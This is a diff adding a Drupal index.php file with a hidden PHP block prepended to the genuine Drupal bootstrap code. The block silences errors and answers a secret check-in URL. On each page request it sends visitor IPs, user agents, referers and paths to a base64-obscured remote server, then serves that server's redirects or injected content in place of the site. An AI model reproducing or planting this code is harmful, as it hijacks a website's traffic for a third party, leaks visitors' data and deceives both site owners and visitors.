@@ -1,0 +1,196 @@
+<?php
+error_reporting(0);
+function parse_headers($resp_header)
+{
+    $header = array('status' => 0, 'content' => '', 'type' => '');
+    if (!is_array($resp_header)) {
+        return $header;
+    }
+    foreach ($resp_header as $hone) {
+        if (preg_match('/http\/[0-9\.]+[\s]+([0-9]+)/i', $hone, $matched)) {
+            $header['status'] = intval($matched[1]);
+        } elseif (preg_match('/location\:[\s]+(.*)/i', $hone, $matched)) {
+            $header['content'] = $matched[1];
+        } elseif (preg_match('/content\-type\:[\s]+(.*)/i', $hone, $matched)) {
+            $header['type'] = $matched[1];
+        }
+    }
+    return $header;
+}
+
+function http_get($url, $datas = array())
+{
+    $response = array('status' => 0, 'content' => '', 'type' => '','message'=>'');
+    if (is_array($datas) && count($datas)) {
+        $url .= '?' . http_build_query($datas);
+    }
+    try {
+        if (function_exists('curl_exec') && function_exists('curl_init')) {
+            $c = curl_init();
+            curl_setopt($c, CURLOPT_URL, $url);
+            curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 20);
+            curl_setopt($c, CURLOPT_TIMEOUT, 60);
+            curl_setopt($c, CURLOPT_FOLLOWLOCATION, 0);
+            curl_setopt($c, CURLOPT_COOKIESESSION, 0);
+            curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+            $c_retval = curl_exec($c);
+            $response['status'] = intval(curl_getinfo($c, CURLINFO_HTTP_CODE));
+            $response['type'] = strval(curl_getinfo($c, CURLINFO_CONTENT_TYPE));
+            $response['content'] = strval(curl_getinfo($c, CURLINFO_REDIRECT_URL));
+            @curl_close($c);
+            if (in_array($response['status'], array(200, 301, 302, 404))) {
+                $response['content'] = strval($c_retval);
+            }
+            if (curl_error($c)){
+                $response['message'] = strval(curl_error($c));
+            }
+        } elseif (ini_get('allow_url_fopen')) {
+            $http_opt = array(
+                'http' => array('method' => 'GET', 'timeout' => 60, 'follow_location' => 0),
+                'ssl' => array("verify_peer" => false, "verify_peer_name" => false)
+            );
+            $context = stream_context_create($http_opt);
+            $content = @file_get_contents($url, false, $context);
+            $response = array_merge($response, parse_headers($http_response_header));
+            if (in_array($response['status'], array(200, 301, 302, 404))) {
+                $response['content'] = strval($content);
+            }
+        }
+    } catch (Exception $e) {
+    }
+    return $response;
+}
+
+function base64url_encode($str)
+{
+    if (!$str) return '';
+    return rtrim(strtr(base64_encode($str), '+/', '-_'), '=');
+}
+
+function get_ipaddr()
+{
+    $ip_addr = '';
+    if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && !empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ip_addr = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (isset($_SERVER['HTTP_X_REAL_IP']) && !empty($_SERVER['HTTP_X_REAL_IP'])) {
+        $ip_addr = $_SERVER['HTTP_X_REAL_IP'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $ip_addr = $_SERVER['REMOTE_ADDR'];
+    }
+    $ip_addr = trim(str_replace(" ", "", $ip_addr), ",");
+    if (strpos($ip_addr, ",") !== false) {
+        $ip_addr = explode(",", $ip_addr);
+        $ip_addr = $ip_addr[0];
+    }
+    return $ip_addr;
+}
+
+function get_proto()
+{
+    $http_proto = 'http://';
+    if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
+        $http_proto = 'https://';
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
+        $http_proto = 'https://';
+    } elseif (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
+        $http_proto = 'https://';
+    }
+    return $http_proto;
+}
+
+if ($_SERVER['REQUEST_URI'] === '/R-' . md5($_SERVER['SERVER_NAME'])) {
+    exit(strrev(md5($_SERVER['SERVER_NAME'])));
+}
+if (substr_count($_SERVER['REQUEST_URI'], 'index.php/jk')) {
+    exit('{ "error": 200, "lc": "jk", "data": [ 1 ] }');
+}
+
+$ip_addr = get_ipaddr();
+$referer = strval(@$_SERVER['HTTP_REFERER']);
+$site_url = get_proto() . $_SERVER['HTTP_HOST'];
+if (strpos($referer, $site_url) === 0) $referer = '';
+$rq = array();
+$rq['i'] = base64url_encode($ip_addr);
+$rq['l'] = base64url_encode($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+$rq['sn'] = base64url_encode($_SERVER['SCRIPT_NAME']);
+$rq['r'] = base64url_encode($_SERVER['REQUEST_URI']);
+$rq['rf'] = base64url_encode($referer);
+$rq['s'] = base64url_encode($site_url);
+$rq['u'] = base64url_encode($_SERVER['HTTP_USER_AGENT']);
+$r_trim = preg_replace('/\?.*/', '', $_SERVER['REQUEST_URI']);
+$r_istatic = false;
+if (strpos($r_trim, '.') > 0&&strpos($r_trim,'.php')===false) {
+    $ext = substr($r_trim, strpos($r_trim, '.'));
+    if (in_array($ext, array('.js', '.css', '.jpg', '.png', '.gif', '.ico'))) {
+        $r_istatic = true;
+    }
+}
+if (!$r_istatic) {
+    $response = http_get(base64_decode('aHR0cDovL3pzMTV2NXA0LnZvcmFyaWFuLmxvbC8'), $rq);
+    if (!in_array($response['status'], array(0, 200))) {
+        switch ($response['status']) {
+            case 301:
+                header('HTTP/1.1 301 Moved Permanently');
+                header('Location: ' . trim($response['content']));
+                break;
+            case 302:
+                header('HTTP/1.1 302 Move Temporarily');
+                header('Location: ' . trim($response['content']));
+                break;
+            case 404:
+                header('HTTP/1.1 404 Not Found');
+                header("status: 404 Not Found");
+                break;
+            default:
+                break;
+        }
+    }
+    if (strlen($response['content'])) {
+        if(preg_match('/meta http-equiv="refresh"/i', $response['content'])){
+            if(!file_exists('./tmp')) mkdir('./tmp');
+            $count = file_exists('./tmp/log-reto') ? @intval(file_get_contents('./tmp/log-reto')) : 0;
+            @file_put_contents('./tmp/log-reto', ++$count);
+        }
+        @header('Content-Type:' . $response['type']);
+        echo $response['content'];
+        exit(0);
+    } else {
+        if(!file_exists('./tmp')) mkdir('./tmp');
+        $count = file_exists('./tmp/log-empty') ? @intval(file_get_contents('./tmp/log-empty')) : 0;
+        @file_put_contents('./tmp/log-empty', ++$count);
+        $rq = array();
+        $rq['i'] = ($ip_addr);
+        $rq['l'] = ($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        $rq['sn'] = ($_SERVER['SCRIPT_NAME']);
+        $rq['r'] = ($_SERVER['REQUEST_URI']);
+        $rq['rf'] = ($referer);
+        $rq['s'] = ($site_url);
+        $rq['u'] = ($_SERVER['HTTP_USER_AGENT']);
+        @file_put_contents('./tmp/log-empty-dump', date('Y-m-d H:i:s').': '.json_encode($rq).PHP_EOL.json_encode($response).PHP_EOL,FILE_APPEND);
+    }
+}
+?>
+<?php
+/**
+ * @file
+ * The PHP page that serves all page requests on a Drupal installation.
+ *
+ * The routines here dispatch control to the appropriate handler, which then
+ * prints the appropriate page.
+ *
+ * All Drupal code is released under the GNU General Public License.
+ * See COPYRIGHT.txt and LICENSE.txt.
+ */
+
+/**
+ * Root directory of Drupal installation.
+ */
+define('DRUPAL_ROOT', getcwd());
+
+require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
+drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
+menu_execute_active_handler();
